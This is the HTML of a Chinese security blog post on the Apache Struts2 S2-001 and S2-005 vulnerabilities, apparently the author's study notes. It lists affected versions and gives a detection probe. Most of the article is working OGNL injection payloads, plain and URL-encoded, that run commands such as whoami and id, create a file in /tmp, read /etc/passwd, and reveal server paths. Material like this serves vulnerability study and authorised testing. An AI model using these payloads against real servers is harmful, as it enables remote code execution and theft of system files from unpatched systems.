@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Struts2 | DropAnn</title><meta name="keywords" content="java"><meta name="author" content="DropAnn"><meta name="copyright" content="DropAnn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="S2-001影响范围官方公告：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-001 漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8 检测1%&amp;#123;1+1&amp;#125;  利用获取tomcat路径 1%&amp;#123;&quot;tomcatBinDir&amp;#123;&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2">
+<meta property="og:url" content="https://dropann.github.io/p/5f2c3bbb.html">
+<meta property="og:site_name" content="DropAnn">
+<meta property="og:description" content="S2-001影响范围官方公告：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-001 漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8 检测1%&amp;#123;1+1&amp;#125;  利用获取tomcat路径 1%&amp;#123;&quot;tomcatBinDir&amp;#123;&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/900017.jpg">
+<meta property="article:published_time" content="2023-01-31T07:50:08.000Z">
+<meta property="article:modified_time" content="2023-02-09T02:53:08.492Z">
+<meta property="article:author" content="DropAnn">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/900017.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dropann.github.io/p/5f2c3bbb"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Struts2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-09 10:53:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210819224420.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-heartbeat"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/usedlink/"><i class="fa-fw fas fa-thumbs-up"></i><span> 常用链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/900017.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DropAnn</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-heartbeat"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/usedlink/"><i class="fa-fw fas fa-thumbs-up"></i><span> 常用链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Struts2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-31T07:50:08.000Z" title="发表于 2023-01-31 15:50:08">2023-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-09T02:53:08.492Z" title="更新于 2023-02-09 10:53:08">2023-02-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">817</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Struts2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>官方公告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>获取tomcat路径</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20230131161757678.png" alt="image-20230131161757678"></p>
+<p>获取web目录</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20230131173116011.png" alt="image-20230131173116011"></p>
+<h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>命令执行1（无回显）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;#_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;</span>)(vaaa)=<span class="keyword">true</span>&amp;(aaaa)((<span class="string">&#x27;#context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]=#vccc&#x27;</span>)(#vccc=<span class="keyword">new</span> java.lang.Boolean(<span class="string">&quot;false&quot;</span>)))&amp;(asdf)((<span class="string">&#x27;#rt.exec(&quot;touch@/tmp/success&quot;.split(&quot;@&quot;))&#x27;</span>)(#rt=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>))=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20230201091625410.png" alt="image-20230201091625410"></p>
+<p>命令执行2（有回显，将需要执行的命令进行urlencode编码）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#req=#context.get(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletReq&#x27;</span>+<span class="string">&#x27;uest&#x27;</span>),#s=<span class="keyword">new</span> java.util.Scanner((<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="string">&#x27;cat /etc/passwd&#x27;</span>.toString().split(<span class="string">&#x27;\\s&#x27;</span>))).start().getInputStream()).useDelimiter(<span class="string">&#x27;\\AAAA&#x27;</span>),#str=#s.hasNext()?#s.next():<span class="string">&#x27;&#x27;</span>,#resp=#context.get(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletRes&#x27;</span>+<span class="string">&#x27;ponse&#x27;</span>),#resp.setCharacterEncoding(<span class="string">&#x27;UTF-8&#x27;</span>),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20230201092644159.png" alt="image-20230201092644159"></p>
+<p>命令执行3（低版本Tomcat）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;%5Cu0023context%5B%5C&#x27;</span>xwork.MethodAccessor.denyMethodExecution%5C<span class="string">&#x27;%5D%5Cu003dfalse&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET&#x27;</span>)(kxlzx)(kxlzx)&amp;(<span class="string">&#x27;%5Cu0023mycmd%5Cu003d%5C&#x27;</span>id%5C<span class="string">&#x27;&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime().exec(%5Cu0023mycmd)&#x27;</span>)(bla)(bla)&amp;(A)((<span class="string">&#x27;%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream(%5Cu0023myret.getInputStream())&#x27;</span>)(bla))&amp;(B)((<span class="string">&#x27;%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D&#x27;</span>)(bla))&amp;(C)((<span class="string">&#x27;%5Cu0023mydat.readFully(%5Cu0023myres)&#x27;</span>)(bla))&amp;(D)((<span class="string">&#x27;%5Cu0023mystr%5Cu003dnew%5C40java.lang.String(%5Cu0023myres)&#x27;</span>)(bla))&amp;(<span class="string">&#x27;%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;</span>)(bla)(bla)&amp;(E)((<span class="string">&#x27;%5Cu0023myout.getWriter().println(%5Cu0023mystr)&#x27;</span>)(bla))</span><br></pre></td></tr></table></figure>
+
+<p>命令执行4（高版本Tomcat）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;</span>)(kxlzx)(kxlzx)&amp;(<span class="string">&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;\u0023mycmd\u003d\&#x27;whoami\&#x27;&#x27;</span>)(bla)(bla)&amp;(<span class="string">&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;</span>)(bla)(bla)&amp;(A)((<span class="string">&#x27;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#x27;</span>)(bla))&amp;(B)((<span class="string">&#x27;\u0023myres\u003dnew\40byte[51020]&#x27;</span>)(bla))&amp;(C)((<span class="string">&#x27;\u0023mydat.readFully(\u0023myres)&#x27;</span>)(bla))&amp;(D)((<span class="string">&#x27;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#x27;</span>)(bla))&amp;(<span class="string">&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;</span>)(bla)(bla)&amp;(E)((<span class="string">&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;</span>)(bla))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>&amp;</code>,<code>@</code>,<code>[]</code>不能编码</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">28</span>%<span class="number">27</span>%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%<span class="number">27</span>]%5Cu003dfalse%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.excludeProperties%5Cu003d<span class="meta">@java</span>.util.Collections<span class="meta">@EMPTY_SET</span>%<span class="number">27</span>%<span class="number">29</span>%28kxlzx%<span class="number">29</span>%28kxlzx%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%<span class="number">27</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myret%5Cu003d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%5Cu0023mycmd%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28A%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%<span class="number">28</span>%5Cu0023myret.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28B%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myres%5Cu003dnew%5C40byte[<span class="number">51020</span>]%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28C%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat.readFully%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%<span class="number">28D</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout%5Cu003d<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28E%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout.getWriter%<span class="number">28</span>%<span class="number">29.</span>println%<span class="number">28</span>%5Cu0023mystr%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20230201094824003.png" alt="image-20230201094824003"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">DropAnn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dropann.github.io/p/5f2c3bbb.html">https://dropann.github.io/p/5f2c3bbb.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dropann.github.io" target="_blank">DropAnn</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a></div><div class="post_share"><div class="social-share" data-image="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/900017.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/p/ac1ae772.html"><img class="prev-cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/1080106.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Spring学习</div></div></a></div><div class="next-post pull-right"><a href="/p/151cc662.html"><img class="next-cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/93146375_p0_master1200.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Fastjson漏洞利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/ac1ae772.html" title="Spring学习"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/1080106.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-10</div><div class="title">Spring学习</div></div></a></div><div><a href="/p/151cc662.html" title="Fastjson漏洞利用"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/93146375_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-09</div><div class="title">Fastjson漏洞利用</div></div></a></div><div><a href="/p/1448a178.html" title="java安全常用脚本"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829164629849.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-25</div><div class="title">java安全常用脚本</div></div></a></div><div><a href="/p/daaeebb0.html" title="RMI"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829164700143.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-08</div><div class="title">RMI</div></div></a></div><div><a href="/p/e8376cac.html" title="Java反序列化利用链总结"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/cover/defunct/958063.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">Java反序列化利用链总结</div></div></a></div><div><a href="/p/159c8b21.html" title="IDEA远程调试"><img class="cover" src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/101772529_p0_master1200.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-24</div><div class="title">IDEA远程调试</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210819224420.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DropAnn</div><div class="author-info__description">在研发和安服仔之间徘徊</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DropAnn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DropAnn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dropann@hotmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-001"><span class="toc-number">1.</span> <span class="toc-text">S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-005"><span class="toc-number">2.</span> <span class="toc-text">S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span 